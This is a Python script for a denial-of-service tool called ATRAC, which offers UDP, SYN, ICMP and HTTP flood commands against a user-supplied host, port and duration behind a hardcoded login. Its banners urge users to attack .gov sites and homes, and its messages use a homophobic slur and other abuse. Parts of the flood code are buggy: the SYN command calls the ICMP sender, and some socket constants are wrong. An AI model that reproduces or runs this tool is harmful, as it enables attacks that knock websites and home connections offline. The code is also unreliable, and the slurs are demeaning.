#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

methods = """\033[35m
╔══════════════════════════════════════════════════════╗
║                     \033[35mDDOS Shit\033[35m                        ║               
║══════════════════════════════════════════════════════║
║ \033[35mUDP (HOST) (PORT) (TIME) (SIZE)  \033[35m|\033[35m UDP Attack.\033[35m       ║
║ \033[35mSYN (HOST) (PORT) (TIME) (SIZE)  \033[35m|\033[35m SYN Attack.\033[35m       ║
║ \033[35mICMP (HOST) (PORT) (TIME) (SIZE) \033[35m|\033[35m ICMP Attack.\033[35m      ║
║ \033[35mHTTP (HOST) (PORT) (TIME) (SIZE) \033[35m|\033[35m HTTP Attack.\033[35m      ║
╚══════════════════════════════════════════════════════╝\033[35m
"""

info = """\033[35m
╔══════════════════════════════════════════════════════╗
║                     \033[34mATRAC Shit\033[34m                       ║
║══════════════════════════════════════════════════════║
║ \033[00m[~] ATRAC Was Made By Unssaid ~~ ENJOY!\033[91m                ║
║ \033[00m[~] Discord: Unssaid#6686.\033[91m                             ║
║ \033[00m[~] Instagram: JackingSaid.\033[91m                                ║
║ \033[00m[~] YouTube: Nonbruh.\033[91m                                  ║
╚══════════════════════════════════════════════════════╝\033[35m
"""

extras = """\033[34m
╔══════════════════════════════════════════════════════╗
║                        \033[34mExtra Shit\033[35m                    ║
║══════════════════════════════════════════════════════║
║ \033[34mAttacks        \033[34m|\033[34m Shows How Many Running Attacks.\033[35m     ║
║ \033[34mStop           \033[34m|\033[34m Stops All Running Attacks.\033[35m          ║
║ \033[34mResolve (HOST) \033[34m|\033[35m Grabs A Domains IP.\033[35m                 ║
╚══════════════════════════════════════════════════════╝\033[35m
"""

help = """\033[34m
╔══════════════════════════════════════════════════════╗
║                    \033[34mBasic Shit\033[34m                        ║
║══════════════════════════════════════════════════════║
║ \033[35mMethods \033[34m|\033[34m Shows DDOS Methods to Fuck homes.\033[34m          ║
║ \033[35mExtras  \033[34m|\033[34m Shows Extra Commands.\033[34m                      ║
║ \033[35mUpdates \033[34m|\033[34m Shows Update Notes For ATRAC.\033[34m              ║
║ \033[35mInfo    \033[34m|\033[34m Shows ATRAC Info.\033[34m                          ║
║ \033[35mClear   \033[34m|\033[34m Clears Screen.\033[34m                             ║
║ \033[35mExit    \033[34m|\033[34m Exits Out Of ATRAC.\033[34m                        ║
╚══════════════════════════════════════════════════════╝\033[34m
"""

updatenotes = """\033[35m
╔══════════════════════════════════════════════════════╗
║                     \033[35mUpdate Shit\033[35m                      ║
║══════════════════════════════════════════════════════║  
║ \033[35m[~] Personally Made By Unssaid.\033[91m                           ║
║ \033[35m[~] Took Out Some Tools.\033[35m                             ║
║ \033[35m[~] User And Pass Changed To ATRAC.\033[35m                  ║
║ \033[35m[~] Making Net That Will Clap Shit.\033[91m                  ║   
║ \033[35m[~] All Tools Fixed And Working.\033[35m                     ║
╚══════════════════════════════════════════════════════╝\033[35m
"""

banner = """
         \033[35m
         █████╗ ████████╗██████╗  █████╗  ██████╗
	██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗██╔════╝
	███████║   ██║   ██████╔╝███████║██║
	██╔══██║   ██║   ██╔══██╗██╔══██║██║
	██║  ██║   ██║   ██║  ██║██║  ██║╚██████╗
	╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝
	       We Are All Apart of ATRAC
                                   \033[35m
		\033[34m
	       Now Go Hit Some .GOV Sites
                                  \033[34m
                           
+	-	+	-	+	-	+	-	+	-
	+ 		+		+		+		+
										
                  
"""

cookie = open(".Sinful_Cookie","w+")

fsubs = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = True
http = True
udp = True
syn = True
icmp = True


def synsender(host, port, timer, punch):
	global said
	global syn
	global aid
	global tattacks
	timeout = time.time() + float(timer)
	sock = socket.socket (socket.AF_INET, socket.SOCK_RAW, socket.TCP_SYNCNT)

	said += 1
	tattacks += 1
	aid += 1
	while time.time() < timeout and syn and attack:
		sock.sendto(punch, (host, int(port)))
	said -= 1
	aid -= 1

def udpsender(host, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(host, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (host, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(host, port, timer, punch):
	global haid
	global http
	global aid
	global tattacks

	timeout = time.time() + float(timer)

	haid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.sendto(punch, (host, int(port)))
			sock.close()
		except socket.error:
			pass

	haid -= 1
	aid -= 1


def main():
	global fsubs
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global http

	while True:
		sys.stdout.write("\x1b]2;ATRAC ~~ Made By Unssaid\x07")
		sin = input("\033[1;35m[\033[35mOG\033[1;35m]-\033[35m\033[35m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "help":
			print (help)
			main()
		elif sinput == "extras":
			print (extras)
			main()
		elif sinput == "exit":
			print ("[\033[35mOG\033[35m] You Are Exiting Out Of ATRAC.\n")
			exit()
		elif sinput == "methods":
			print (methods)
			main()
		elif sinput == "updates":
			print (updatenotes)
			main()
		elif sinput == "info":
			print (info)
			main()
		elif sinput == "attacks":
			print ("[\033[35mOG\033[35m] Faggots Slammed: {}\n".format (aid))
			main()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mOG\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
			main()
		elif sinput == "udp":
			if username == "Guest":
				print ("[\033[91mOG\033[00m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("[\033[35mOG\033[35m] You Fucked: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mOG\033[00m] The Command {} Requires An Argument Dumb Fuck.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[34mOG\033[34m] Host: {} Invalid.\n".format (host))
					main()
		elif sinput == "http":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("[\033[91mOG\033[00m] You Fucked: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=httpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mOG\033[00m] The Command {} Requires An Argument Dumb Fuck.\n".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mOG\033[00m] Host: {} Invalid.\n".format (host))
				main()
		elif sinput == "icmp":
			if username == "Guest":
				print ("[\033[91mOG\033[00m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("[\033[91mOG\033[00m] You Fucked: {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mOG\033[00m] The Command {} Requires An Argument Dumb Fuck.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mOG\033[00m] Host: {} Invalid.\n".format (host))
					main()
		elif sinput == "syn":
			try:
				sinput, host, port, timer, pack = sin.split(" ")
				socket.gethostbyname(host)
				print ("[\033[91mOG\033[00m] you fucked: {}\n".format (host))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(host, port, timer, punch)).start()
			except ValueError:
				print ("[\033[91mOG\033[00m] The Command {} Is Wrong Dumb Fuck.\n".format (sinput))
				main()
			except socket.gaierror:
				print ("[\033[91mOG\033[00m] Host: {} Invalid.\n".format (host))
				main()
		elif sinput == "stop":
			print ("[\033[35mOG\033[35m] All skids have begged for forgiveness.\n")
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stopped All Attacks\n")
				udp = False
				while not udp:
					if aid == 0:
						print ("[\033[91mOG\033[00m] No UDP Processes Running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping All ICMP Attacks.\n")
				icmp = False
				while not icmp:
					print ("[\033[91mOG\033[00m] No ICMP Processes Running.")
					udp = True
					main()
		else:
			print ("[\033[34mOG\033[34m] {} Is Not A Command Dumb Fuck.\n".format(sinput))
			main()



try:
	users = ["ATRAC", "ATRAC"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, You Dont Have The Knowledge Buddy ;).\n")
		exit()
except KeyboardInterrupt:
	exit()
try:
	passwords = ["ATRAC", "ATRAC"]
	password = getpass.getpass ("[+] Password: ")
	if user == "ATRAC":
		if password == passwords[0]:
			print ("[+] Access Granted Weclome To The OGS.")
			print ("[+] Type Help To See Commands for Unssaid Slammer ;).")
			cookie.write("DIE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mOG\033[00m] Ctrl-C, Dont Leave Too Soon ;) Remember We are ALL Clowns.\n")
				main()
		else:
			print ("[+] Incorrect, Your Not Worthy ;).\n")
			exit()
	if user == "ATRAC":
		if password == passwords[1]:
			print ("[+] Access Granted You Have Knowledge ;).")
			print ("[+] Certain Methods Will Not Be Available To You.")
			print ("[+] Type Help To See Commands.")
			time.sleep(5)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mOG\033[00m] Ctrl-C Has Been Pressed, Dont Leave This Soon ;).\n")
				main()
		else:
			print ("[+] Incorrect, Try Again Next Time ;).\n")
			exit()
except KeyboardInterrupt:
	exit()